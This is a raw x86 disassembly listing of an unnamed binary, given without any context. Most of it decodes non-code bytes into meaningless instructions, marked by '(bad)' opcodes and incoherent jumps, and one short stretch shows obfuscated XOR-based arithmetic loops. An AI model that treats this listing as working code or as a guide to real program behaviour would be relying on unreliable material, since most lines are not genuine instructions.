  41ec75:	repnz ds into 
  41ec78:	dec    esi
  41ec79:	adc    DWORD PTR ss:[edx-0x64],eax
  41ec7d:	je     0x41ec56
  41ec7f:	sbb    edx,DWORD PTR [ebx]
  41ec81:	lahf   
  41ec82:	test   BYTE PTR [edx+eax*8-0x69],0x55
  41ec87:	add    ecx,DWORD PTR [edx+0x32f31015]
  41ec8d:	(bad)  
  41ec8e:	push   edx
  41ec8f:	mov    esi,0xa1ff5dc6
  41ec94:	cwde   
  41ec95:	mov    ch,0x53
  41ec97:	dec    ebx
  41ec98:	add    eax,esp
  41ec9a:	sbb    BYTE PTR [ebp+0x3c],ah
  41ec9d:	push   eax
  41ec9e:	push   ebx
  41ec9f:	cmp    BYTE PTR [ecx],0x6a
  41eca2:	das    
  41eca3:	fs aam 0xd
  41eca6:	sbb    dl,al
  41eca8:	ds xchg ecx,eax
  41ecaa:	push   esi
  41ecab:	mov    cl,0xd4
  41ecad:	sub    al,0x1c
  41ecaf:	push   eax
  41ecb0:	cmp    bh,dh
  41ecb2:	ins    DWORD PTR es:[edi],dx
  41ecb3:	mov    dl,0xf0
  41ecb5:	xchg   dh,bh
  41ecb7:	in     eax,0xe6
  41ecb9:	les    ecx,FWORD PTR [edx-0x44e13a9b]
  41ecbf:	push   edi
  41ecc0:	xor    al,0x12
  41ecc2:	sub    DWORD PTR [ebp-0x7ead6930],ecx
  41ecc8:	fucom  st(6)
  41ecca:	ins    BYTE PTR es:[edi],dx
  41eccb:	push   ecx
  41eccc:	inc    esi
  41eccd:	inc    ebx
  41ecce:	pop    esp
  41eccf:	std    
  41ecd0:	add    BYTE PTR [ebp-0x3],bh
  41ecd3:	ins    DWORD PTR es:[edi],dx
  41ecd4:	mov    esi,0xa7425bf0
  41ecd9:	sub    BYTE PTR [esi],cl
  41ecdb:	push   edx
  41ecdc:	mov    bl,0x4c
  41ecde:	enter  0xb8d0,0xff
  41ece2:	sti    
  41ece3:	sti    
  41ece4:	push   eax
  41ece5:	mov    edi,esp
  41ece7:	repnz ins DWORD PTR es:[edi],dx
  41ece9:	scas   eax,DWORD PTR es:[edi]
  41ecea:	xlat   BYTE PTR ds:[ebx]
  41eceb:	fcomp  DWORD PTR [ebx]
  41eced:	mov    BYTE PTR [edx-0x677ab9ad],al
  41ecf3:	mov    esi,0xf58c96ed
  41ecf8:	pop    ebx
  41ecf9:	ret    0x76bb
  41ecfc:	push   0xd241814c
  41ed01:	cmp    eax,0x1105a5e5
  41ed06:	popa   
  41ed07:	mov    es,WORD PTR [ebp+0x62]
  41ed0a:	mov    eax,ds:0x1bc12f8a
  41ed0f:	pusha  
  41ed10:	jbe    0x41ed41
  41ed12:	(bad)  
  41ed13:	gs push esp
  41ed15:	sbb    al,0x59
  41ed17:	pop    edx
  41ed18:	and    DWORD PTR [edi-0x51],esi
  41ed1b:	call   0x6914:0xe9184567
  41ed22:	add    al,0x4c
  41ed24:	fadd   QWORD PTR [edi+0x37]
  41ed27:	int    0xee
  41ed29:	jg     0x41ed48
  41ed2b:	enter  0xa13e,0x64
  41ed2f:	cmp    al,0x8e
  41ed31:	adc    al,0x81
  41ed33:	lds    edx,FWORD PTR [edx-0x7a]
  41ed36:	js     0x41ed52
  41ed38:	push   es
  41ed39:	pusha  
  41ed3a:	setle  BYTE PTR [esi+ecx*4-0x1b]
  41ed3f:	mov    cl,bl
  41ed41:	ds xchg esi,eax
  41ed43:	adc    eax,0x469734cc
  41ed48:	aas    
  41ed49:	dec    edi
  41ed4a:	jne    0x41eccd
  41ed4c:	xchg   esi,eax
  41ed4d:	in     al,0xd9
  41ed4f:	or     cl,BYTE PTR [ecx+0x3a4cc17f]
  41ed55:	and    BYTE PTR [eax],0x97
  41ed58:	ds jb  0x41ecf7
  41ed5b:	mov    ebp,0xa763dcad
  41ed60:	adc    eax,0x80ed27b5
  41ed65:	cmp    DWORD PTR [ebx-0xb7e0d12],ecx
  41ed6b:	dec    edx
  41ed6c:	or     al,0x65
  41ed6e:	lods   eax,DWORD PTR ds:[esi]
  41ed6f:	test   al,0x24
  41ed71:	push   es
  41ed72:	mov    esp,0x8cc5a4eb
  41ed77:	mul    DWORD PTR [edi+0x1c]
  41ed7a:	or     eax,0x331f1613
  41ed7f:	sbb    al,0x89
  41ed81:	lea    edx,ds:0xda7f8c64
  41ed87:	daa    
  41ed88:	stc    
  41ed89:	sbb    al,0x65
  41ed8b:	addr16 inc ebx
  41ed8d:	sahf   
  41ed8e:	std    
  41ed8f:	mov    ds:0xec55a22f,al
  41ed94:	sbb    eax,0x7071662b
  41ed99:	scas   al,BYTE PTR es:[edi]
  41ed9a:	mov    bh,0x7f
  41ed9c:	mov    bl,0xec
  41ed9e:	and    edi,ecx
  41eda0:	lahf   
  41eda1:	pop    eax
  41eda2:	lahf   
  41eda3:	or     edx,edx
  41eda5:	hlt    
  41eda6:	fst    DWORD PTR [edx-0x31777528]
  41edac:	jle    0x41edb8
  41edae:	mov    eax,ds:0x9f146be0
  41edb3:	cdq    
  41edb4:	fild   DWORD PTR [esi]
  41edb6:	out    0x9a,al
  41edb8:	jecxz  0x41ee17
  41edba:	mov    ebp,0x65747cd9
  41edbf:	test   eax,0xcfee28a0
  41edc4:	inc    edx
  41edc5:	xchg   ebx,eax
  41edc6:	xchg   edx,eax
  41edc7:	gs popf 
  41edc9:	stc    
  41edca:	fidivr DWORD PTR [esi]
  41edcc:	aad    0xd9
  41edce:	popa   
  41edcf:	in     al,0x95
  41edd1:	in     eax,dx
  41edd2:	adc    eax,0x21cc4183
  41edd7:	mov    edi,eax
  41edd9:	scas   al,BYTE PTR es:[edi]
  41edda:	mov    ds:0x994e1158,al
  41eddf:	hlt    
  41ede0:	jmp    0xa1e88ef2
  41ede5:	push   esi
  41ede6:	cs inc ebp
  41ede8:	jl     0x41ee14
  41edea:	mov    DWORD PTR [edi+ecx*8-0x57],esi
  41edee:	cli    
  41edef:	and    eax,0x2a0b291a
  41edf4:	dec    eax
  41edf5:	or     BYTE PTR [edi],ch
  41edf7:	stos   DWORD PTR es:[edi],eax
  41edf8:	mov    ah,0x46
  41edfa:	mov    WORD PTR [ebx+0x71],ss
  41edfd:	repnz retf 
  41edff:	lods   eax,DWORD PTR ds:[esi]
  41ee00:	mov    ebx,0xd0e0c57b
  41ee05:	pop    ecx
  41ee06:	mov    ds:0x9d31fa9f,eax
  41ee0b:	test   ah,0x2d
  41ee0e:	cli    
  41ee0f:	repnz rcr DWORD PTR [edi],cl
  41ee12:	and    al,0xfa
  41ee14:	xchg   esi,eax
  41ee15:	cmp    bh,ch
  41ee17:	sbb    ecx,eax
  41ee19:	in     al,dx
  41ee1a:	mov    al,0xec
  41ee1c:	mov    dl,0x9
  41ee1e:	push   DWORD PTR [ecx-0x78abe42f]
  41ee24:	popf   
  41ee25:	mov    al,ds:0x15df19ea
  41ee2a:	sub    DWORD PTR [ecx-0x17fb7415],edx
  41ee30:	gs push eax
  41ee32:	cld    
  41ee33:	xor    BYTE PTR [eax],bh
  41ee35:	jb     0x41edc8
  41ee37:	adc    edx,DWORD PTR [eax]
  41ee39:	jbe    0x41ee83
  41ee3b:	fld    TBYTE PTR [edi-0x65]
  41ee3e:	dec    ebp
  41ee3f:	dec    ecx
  41ee40:	jge    0x41eec0
  41ee42:	in     eax,0xfb
  41ee44:	cmp    ah,BYTE PTR [ebx+0x3026a9fe]
  41ee4a:	fwait
  41ee4b:	mov    WORD PTR [eax+ebp*1+0x66],?
  41ee4f:	cvtdq2ps xmm0,XMMWORD PTR [eax+ebp*2-0x57]
  41ee54:	xchg   ecx,eax
  41ee55:	les    esp,FWORD PTR [ebx+ecx*8+0x40467812]
  41ee5c:	jmp    0x4a97:0x26984a5d
  41ee63:	pop    edi
  41ee64:	pop    esp
  41ee65:	sbb    BYTE PTR [eax+0x5a],bl
  41ee68:	pop    edi
  41ee69:	cmp    al,0xb1
  41ee6b:	adc    DWORD PTR [edi-0xc],edx
  41ee6e:	(bad)  [ebp+0x21]
  41ee71:	xchg   ebx,eax
  41ee72:	shl    ebp,cl
  41ee74:	aam    0x9e
  41ee76:	jle    0x41ee9b
  41ee78:	cmp    edx,DWORD PTR [eax]
  41ee7a:	mov    esp,0x322b96cc
  41ee7f:	inc    esp
  41ee80:	pop    eax
  41ee81:	pop    ds
  41ee82:	add    eax,0xd0e32583
  41ee87:	shl    BYTE PTR [ebp+0x270ac4dc],1
  41ee8d:	cli    
  41ee8e:	xor    BYTE PTR [ecx],0xb3
  41ee91:	outs   dx,BYTE PTR ds:[esi]
  41ee92:	push   edx
  41ee93:	test   al,0xf7
  41ee95:	pop    ebx
  41ee96:	(bad)  
  41ee97:	dec    edi
  41ee98:	sbb    ecx,DWORD PTR [edi-0x1a]
  41ee9b:	fisubr DWORD PTR [ecx+0x49]
  41ee9e:	pushf  
  41ee9f:	popa   
  41eea0:	pop    ebp
  41eea1:	pop    ebx
  41eea2:	sub    al,0x5f
  41eea4:	js     0x41ef0b
  41eea6:	cli    
  41eea7:	add    BYTE PTR [ecx+ecx*1],0x25
  41eeab:	fwait
  41eeac:	daa    
  41eead:	cld    
  41eeae:	mov    WORD PTR [ebp-0x7a],?
  41eeb1:	jg     0x41ef2a
  41eeb3:	pusha  
  41eeb4:	clc    
  41eeb5:	push   ebx
  41eeb6:	jl     0x41eefb
  41eeb8:	repz je 0x41eedf
  41eebb:	xchg   edx,eax
  41eebc:	mov    edx,DWORD PTR [esi]
  41eebe:	pop    edx
  41eebf:	cdq    
  41eec0:	pusha  
  41eec1:	gs cli 
  41eec3:	mov    ch,0xd3
  41eec5:	(bad)  
  41eec6:	repz and eax,0x7e5257b0
  41eecc:	rol    DWORD PTR [ebx+0x5b],cl
  41eecf:	fs push cs
  41eed1:	int3   
  41eed2:	xor    edx,DWORD PTR [ebp-0x53]
  41eed5:	les    eax,FWORD PTR [ebp+0x69f1762a]
  41eedb:	and    ecx,0x2f7fb354
  41eee1:	mov    ecx,DWORD PTR [esi+ebp*2]
  41eee4:	loopne 0x41ef2d
  41eee6:	dec    ebp
  41eee7:	out    dx,eax
  41eee8:	jge    0x41ef52
  41eeea:	bound  esp,QWORD PTR [edi-0xf]
  41eeed:	cld    
  41eeee:	or     al,0x7a
  41eef0:	xchg   esi,eax
  41eef1:	push   edx
  41eef2:	dec    esp
  41eef3:	in     eax,0x11
  41eef5:	(bad)  
  41eef6:	xor    eax,0x1ab26c40
  41eefb:	and    BYTE PTR [edi-0xcb603ff],al
  41ef01:	sub    BYTE PTR [esp+esi*8+0x4f],ah
  41ef05:	adc    DWORD PTR [eax+0x32],ecx
  41ef08:	clc    
  41ef09:	mov    bl,0xc9
  41ef0b:	mov    ss,WORD PTR [edx+0x5e]
  41ef0e:	int3   
  41ef0f:	push   eax
  41ef10:	fdiv   DWORD PTR [edx+0x51]
  41ef13:	inc    edx
  41ef14:	xchg   edx,eax
  41ef15:	dec    ebp
  41ef16:	mov    ebx,0xc5965cc9
  41ef1b:	clc    
  41ef1c:	xchg   ebx,eax
  41ef1d:	cli    
  41ef1e:	add    BYTE PTR [eax-0x246072ed],bh
  41ef24:	lds    esp,FWORD PTR [ebx]
  41ef26:	call   0x2cf6a64b
  41ef2b:	mov    ecx,0x26b4bc8
  41ef30:	div    BYTE PTR [bp+di]
  41ef33:	cvtps2pd xmm4,QWORD PTR [ebp-0x34]
  41ef37:	cs pop ds
  41ef39:	push   ss
  41ef3a:	sbb    DWORD PTR [eax+0xf],ebx
  41ef3d:	aam    0xf6
  41ef3f:	fadd   QWORD PTR [ecx-0x50245d1b]
  41ef45:	jae    0x41eecf
  41ef47:	push   esp
  41ef48:	xchg   ecx,eax
  41ef49:	xchg   ecx,eax
  41ef4a:	jg     0x41eefb
  41ef4c:	fwait
  41ef4d:	jecxz  0x41ef83
  41ef4f:	mul    dl
  41ef51:	jmp    0x41ef64
  41ef53:	push   es
  41ef54:	xchg   esp,eax
  41ef55:	fsub   DWORD PTR [ebp+0x79]
  41ef58:	pop    eax
  41ef59:	and    eax,0x42f430cd
  41ef5e:	sti    
  41ef5f:	sub    al,0x9e
  41ef61:	mov    esi,0x424c3de9
  41ef66:	mov    eax,ds:0x7bbf330c
  41ef6b:	stc    
  41ef6c:	nop
  41ef6d:	jecxz  0x41ef47
  41ef6f:	loope  0x41ef69
  41ef71:	std    
  41ef72:	or     eax,0xffffffe2
  41ef75:	outs   dx,BYTE PTR ds:[esi]
  41ef76:	nop
  41ef77:	arpl   WORD PTR [ebx-0xaa33fbd],ax
  41ef7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7e:	inc    ebx
  41ef7f:	jno    0x41ef3e
  41ef81:	and    DWORD PTR [esi+0x6e7ddd25],ebp
  41ef87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef88:	sahf   
  41ef89:	xchg   ecx,eax
  41ef8a:	test   DWORD PTR ds:0x260b212,esp
  41ef90:	inc    edi
  41ef91:	push   eax
  41ef92:	leave  
  41ef93:	retf   0x9e6
  41ef96:	ret    
  41ef97:	dec    eax
  41ef98:	or     eax,0xcb2c0b01
  41ef9d:	inc    eax
  41ef9e:	cmove  eax,DWORD PTR [ecx+0x448ac59c]
  41efa5:	cmp    al,0x42
  41efa7:	or     al,0xbd
  41efa9:	adc    eax,0xfe936068
  41efae:	dec    esp
  41efaf:	lods   eax,DWORD PTR ds:[esi]
  41efb0:	fwait
  41efb1:	stc    
  41efb2:	push   ds
  41efb3:	sub    BYTE PTR [edx-0x6f],al
  41efb6:	ret    
  41efb7:	and    bh,BYTE PTR [ecx+0x77]
  41efba:	pusha  
  41efbb:	ins    DWORD PTR es:[edi],dx
  41efbc:	pushf  
  41efbd:	shl    BYTE PTR [edi*8-0x653e1192],0xd8
  41efc5:	dec    ebp
  41efc6:	out    0xd3,eax
  41efc8:	or     DWORD PTR [edx],0x545714ff
  41efce:	fild   WORD PTR [ebx]
  41efd0:	adc    eax,DWORD PTR [esi-0x4d1b7f28]
  41efd6:	enter  0xfe28,0x40
  41efda:	std    
  41efdb:	inc    ecx
  41efdc:	jp     0x41f047
  41efde:	daa    
  41efdf:	sbb    eax,0x8c879c74
  41efe4:	in     eax,0xbb
  41efe6:	push   esi
  41efe7:	mov    dl,0x61
  41efe9:	xor    eax,0xd9ad4971
  41efee:	xchg   edi,eax
  41efef:	ja     0x41f06b
  41eff1:	mov    eax,0x7e97b726
  41eff6:	pop    ecx
  41eff7:	ficom  DWORD PTR [eax+0x39090fde]
  41effd:	push   ebx
  41effe:	xor    ecx,eax
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x28f86403
  41f0bf:	cmp    DWORD PTR [edi],0x6261d851
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx+0x6a]
  41f0ca:	push   eax
  41f0cb:	add    dh,BYTE PTR [ebx+0x47]
  41f0ce:	jns    0x41f112
  41f0d0:	fldenv [edx-0x191616ba]
  41f0d6:	sar    esi,0x52
  41f0d9:	add    esp,ebp
  41f0db:	cmc    
  41f0dc:	lock out 0xa6,al
  41f0df:	pop    edi
  41f0e0:	xor    eax,0x3ed6f225
  41f0e5:	jbe    0x41f123
  41f0e7:	test   BYTE PTR [edi-0x4d],cl
  41f0ea:	scas   eax,DWORD PTR es:[edi]
  41f0eb:	mov    cs,WORD PTR [edx+0x3e142e30]
  41f0f1:	xchg   ebx,eax
  41f0f2:	cli    
  41f0f3:	push   cs
  41f0f4:	call   0x3f8d:0xb323c13d
  41f0fb:	lods   eax,DWORD PTR ds:[esi]
  41f0fc:	xlat   BYTE PTR ds:[ebx]
  41f0fd:	enter  0xeb6d,0xef
  41f101:	push   ebp
  41f102:	jecxz  0x41f12b
  41f104:	ret    0x1b08
  41f107:	ror    DWORD PTR [edx],cl
  41f109:	inc    edx
  41f10a:	icebp  
  41f10b:	mov    fs,WORD PTR [edi-0x72df6a97]
  41f111:	and    al,0xfb
  41f113:	dec    ebx
  41f114:	jnp    0x41f190
  41f116:	adc    DWORD PTR [esi+0x6e],0xffffff8a
  41f11a:	and    dl,cl
  41f11c:	sbb    DWORD PTR [eax-0x5c64f625],ebp
  41f122:	scas   al,BYTE PTR es:[edi]
  41f123:	js     0x41f186
  41f125:	loope  0x41f0a9
  41f127:	xchg   esp,eax
  41f128:	call   0x9583:0xf42176bd
  41f12f:	es inc ebx
  41f131:	repnz rcr cl,0xdc
  41f135:	mov    eax,ds:0x61905e18
  41f13a:	jmp    0x41f18d
  41f13c:	or     eax,0xae324635
  41f141:	pop    ebx
  41f142:	sbb    DWORD PTR [ecx+ecx*1+0x78],ecx
  41f146:	mov    esp,0xa09987bf
  41f14b:	dec    ebp
  41f14c:	mov    DWORD PTR [esi-0x3d7f1c7a],eax
  41f152:	outs   dx,BYTE PTR ds:[esi]
  41f153:	popa   
  41f154:	sbb    al,0x2a
  41f156:	inc    ebx
  41f157:	in     eax,0xe
  41f159:	(bad)  
  41f15a:	mov    al,ds:0x6f588f1e
  41f15f:	push   es
  41f160:	mov    ebx,esp
  41f162:	int    0x33
  41f164:	out    dx,al
  41f165:	(bad)  
  41f166:	aad    0xd2
  41f168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f169:	addr16 pushf 
  41f16b:	nop
  41f16c:	mov    dh,0x68
  41f16e:	jae    0x41f1bc
  41f170:	mov    eax,0xd866295a
  41f175:	pop    edi
  41f176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f177:	push   edx
  41f178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f179:	jno    0x41f192
  41f17b:	popa   
  41f17c:	shl    BYTE PTR [ebx-0x76cbd7e7],0x10
  41f183:	dec    esp
  41f184:	test   eax,0x57b96d64
  41f189:	fsubr  QWORD PTR [si-0x5b1b]
  41f18e:	mov    cl,0x39
  41f190:	test   BYTE PTR [ecx-0x33],0xdf
  41f194:	cwde   
  41f195:	add    BYTE PTR cs:[edi+0x57ee06d6],bh
  41f19c:	lock dec esp
  41f19e:	push   0x7c
  41f1a0:	sub    al,0xac
  41f1a2:	push   esp
  41f1a3:	test   ch,ah
  41f1a5:	cwde   
  41f1a6:	and    BYTE PTR [eax-0x4b],al
  41f1a9:	ja     0x41f1c4
  41f1ab:	out    0xa1,eax
  41f1ad:	mov    ah,0x87
  41f1af:	xor    ah,al
  41f1b1:	mov    eax,fs:0xb0f2dcc5
  41f1b7:	pop    esi
  41f1b8:	rcr    BYTE PTR [ecx-0x4af5ece1],cl
  41f1be:	sahf   
  41f1bf:	addr16 fwait
  41f1c1:	dec    eax
  41f1c2:	push   es
  41f1c3:	mov    bl,BYTE PTR [eax]
  41f1c5:	mov    ebp,0x78a94069
  41f1ca:	shr    BYTE PTR [ecx-0x20e13801],cl
  41f1d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1d1:	(bad)  
  41f1d2:	sahf   
  41f1d3:	xchg   edi,eax
  41f1d4:	inc    ecx
  41f1d5:	adc    DWORD PTR [ebp+0x64],ecx
  41f1d8:	or     ebp,edx
  41f1da:	mov    ebx,0xe52e5599
  41f1df:	cmp    BYTE PTR [ebp-0x6c3fb712],dh
  41f1e5:	dec    eax
  41f1e6:	sbb    bh,cl
  41f1e8:	mov    bh,0x91
  41f1ea:	daa    
  41f1eb:	rcr    ebx,0xca
  41f1ee:	push   ss
  41f1ef:	hlt    
  41f1f0:	lods   eax,DWORD PTR ds:[esi]
  41f1f1:	mov    edi,0xd489ffb0
  41f1f6:	cmc    
  41f1f7:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f1f9:	imul   edi,DWORD PTR [ecx-0x495a55d0],0x4b476bcc
  41f203:	inc    ebx
  41f204:	imul   eax,DWORD PTR [edi+0x1ec77b43],0xfa226a1a
  41f20e:	push   esi
  41f20f:	ret    0x76cf
  41f212:	push   ebx
  41f213:	mov    ds:0x1d7dcd91,al
  41f218:	adc    eax,0xe0f720af
  41f21d:	leave  
  41f21e:	xor    eax,0x16ad2411
  41f223:	dec    esp
  41f224:	or     eax,0xa006d8f3
  41f229:	inc    esi
  41f22a:	dec    edx
  41f22b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f22c:	jl     0x41f26c
  41f22e:	cdq    
  41f22f:	outs   dx,BYTE PTR ds:[esi]
  41f230:	cli    
  41f231:	pop    esi
  41f232:	gs mov bl,0x8
  41f235:	sbb    DWORD PTR [ebx+0x7c5f7698],eax
  41f23b:	jle    0x41f22d
  41f23d:	or     BYTE PTR [ebx],dh
  41f23f:	jbe    0x41f272
  41f241:	in     eax,dx
  41f242:	sti    
  41f243:	out    0x3c,eax
  41f245:	popa   
  41f246:	adc    ecx,DWORD PTR [eax-0x714b1a1]
  41f24c:	iret   
  41f24d:	lods   eax,DWORD PTR ds:[esi]
  41f24e:	xor    al,ah
  41f250:	sbb    eax,DWORD PTR [eax]
  41f252:	int    0xc2
  41f254:	pop    ecx
  41f255:	fcom   DWORD PTR [edi]
  41f257:	adc    al,0x83
  41f259:	clc    
  41f25a:	mov    eax,0x8a487114
  41f25f:	or     ebp,DWORD PTR [ebx-0x73]
  41f262:	xor    DWORD PTR ds:0xc0ab0d81,eax
  41f268:	into   
  41f269:	je     0x41f29a
  41f26b:	(bad)  
  41f26c:	icebp  
  41f26d:	mov    edx,0x26df6ab8
  41f272:	out    0xac,eax
  41f274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f275:	(bad)  
  41f277:	fwait
  41f278:	out    0x50,eax
  41f27a:	leave  
  41f27b:	ret    
  41f27c:	inc    DWORD PTR [ebx]
  41f27e:	in     al,dx
  41f27f:	fstp   DWORD PTR [edx-0x63]
  41f282:	retf   
  41f283:	not    BYTE PTR [ebx]
  41f285:	mov    edx,0x8c875179
  41f28a:	mov    eax,ds:0xd2debee1
  41f28f:	add    BYTE PTR [ecx+0x4cf42e69],cl
  41f295:	loopne 0x41f2ac
  41f297:	repz add eax,0xde4341e1
  41f29d:	jne    0x41f2c6
  41f29f:	inc    ebp
  41f2a0:	mov    ds:0x65e9d47c,al
  41f2a5:	lahf   
  41f2a6:	clc    
  41f2a7:	push   es
  41f2a8:	mov    bh,0xc5
  41f2aa:	je     0x41f2df
  41f2ac:	xlat   BYTE PTR ds:[ebx]
  41f2ad:	aad    0xb6
  41f2af:	cmp    esi,0x15e40e3e
  41f2b5:	addr16 clc 
  41f2b7:	push   edi
  41f2b8:	fdiv   QWORD PTR gs:[ebp-0x7ef4b62c]
  41f2bf:	scas   al,BYTE PTR es:[edi]
  41f2c0:	repnz out 0x81,eax
  41f2c3:	mov    BYTE PTR [ecx-0xb35571b],cl
  41f2c9:	sub    edx,DWORD PTR [edx+0x6a123737]
  41f2cf:	xchg   esp,eax
  41f2d0:	clc    
  41f2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2d2:	pushf  
  41f2d3:	in     al,0x62
  41f2d5:	test   DWORD PTR [ecx+edi*4-0x10],ecx
  41f2d9:	sbb    eax,0xa700957
  41f2de:	pop    ds
  41f2df:	cmc    
  41f2e0:	out    0x7a,al
  41f2e2:	add    ah,BYTE PTR [ecx+0x2779cc3a]
  41f2e8:	repz jne 0x41f275
  41f2eb:	jg     0x41f34d
  41f2ed:	lods   eax,DWORD PTR ds:[esi]
  41f2ee:	dec    eax
  41f2ef:	and    eax,0x303deee9
  41f2f4:	js     0x41f36e
  41f2f6:	pop    ss
  41f2f7:	mov    ah,0x44
  41f2f9:	in     eax,dx
  41f2fa:	arpl   WORD PTR [esi+0x1c],si
  41f2fd:	push   ebx
  41f2fe:	call   0xe3a:0x84880fb2
  41f305:	mov    ch,0x76
  41f307:	iret   
  41f308:	sbb    DWORD PTR [eax],ecx
  41f30a:	lods   ax,WORD PTR ds:[esi]
  41f30c:	mov    cl,0x33
  41f30e:	xor    eax,0x53b763b9
  41f313:	xor    eax,0x561fd84a
  41f318:	mov    ?,ebp
  41f31a:	push   esp
  41f31b:	jecxz  0x41f337
  41f31d:	mov    cl,BYTE PTR [ecx+edi*2-0x33]
  41f321:	add    DWORD PTR [edi-0x24],eax
  41f324:	loope  0x41f392
  41f326:	jmp    0x2dc44fc6
  41f32b:	mov    eax,DWORD PTR [edx+0x72b21205]
  41f331:	mov    ecx,ebp
  41f333:	jge    0x41f2f9
  41f335:	mov    ebp,0xb5854da1
  41f33a:	loope  0x41f384
  41f33c:	add    eax,DWORD PTR [ebp+0x8f2baaa]
  41f342:	loopne 0x41f3be
  41f344:	mov    ch,0xe4
  41f346:	aam    0x24
  41f348:	fdivp  st(0),st
  41f34a:	(bad)  
  41f34b:	in     eax,dx
  41f34c:	cmp    al,BYTE PTR [esp+eiz*2-0x61]
  41f350:	data16 es into 
  41f353:	shl    edi,0xe2
  41f356:	cs jbe 0x41f32d
  41f359:	sub    dl,BYTE PTR [ecx-0x2d669347]
  41f35f:	xlat   BYTE PTR ds:[ebx]
  41f360:	and    al,0x80
  41f362:	push   ebx
  41f363:	fstp   DWORD PTR [ebp-0x737d3c97]
  41f369:	ffreep st(4)
  41f36b:	pop    ds
  41f36c:	ins    DWORD PTR es:[edi],dx
  41f36d:	mov    edx,0x548df622
  41f372:	xchg   DWORD PTR [ecx+ecx*4-0x57],ecx
  41f376:	mov    esp,0x90fede6f
  41f37b:	jno    0x41f321
  41f37d:	push   esi
  41f37e:	retf   0x502e
  41f381:	lea    ecx,[ebx+0x17ffb3d1]
  41f387:	aad    0x48
  41f389:	xor    BYTE PTR [ebp+0x1148e509],ah
  41f38f:	xchg   ebp,eax
  41f390:	test   dh,ah
  41f392:	mov    esi,0xe20d59dc
  41f397:	adc    BYTE PTR [ecx+eiz*8],ah
  41f39a:	scas   eax,DWORD PTR es:[edi]
  41f39b:	cwde   
  41f39c:	fwait
  41f39d:	or     ah,BYTE PTR [edx+esi*8+0x53178db8]
  41f3a4:	sbb    ebp,edi
  41f3a6:	and    ah,BYTE PTR [ecx]
  41f3a8:	xchg   ecx,eax
  41f3a9:	icebp  
  41f3aa:	mov    edx,0x58f54555
  41f3af:	adc    al,0x4f
  41f3b1:	add    al,0xae
  41f3b3:	stos   DWORD PTR es:[edi],eax
  41f3b4:	or     al,0x79
  41f3b6:	pop    ebp
  41f3b7:	test   al,0x28
  41f3b9:	test   BYTE PTR [esp+esi*8-0x303d061a],0x8a
  41f3c1:	add    al,0xac
  41f3c3:	fwait
  41f3c4:	and    eax,0xf204fdd9
  41f3c9:	sbb    BYTE PTR [esi+edi*4-0x22fd2f2f],dh
  41f3d0:	ret    0x50c7
  41f3d3:	inc    esi
  41f3d4:	call   0xea8c:0xd17797f3
  41f3db:	(bad)
  41f3e0:	mov    bl,0xc1
  41f3e2:	cmp    eax,0xa7ff7e4b
  41f3e7:	aam    0x59
  41f3e9:	in     eax,dx
  41f3ea:	push   ebp
  41f3eb:	cmp    eax,DWORD PTR [eax+esi*4-0x19084088]
  41f3f2:	cmp    dh,0x1c
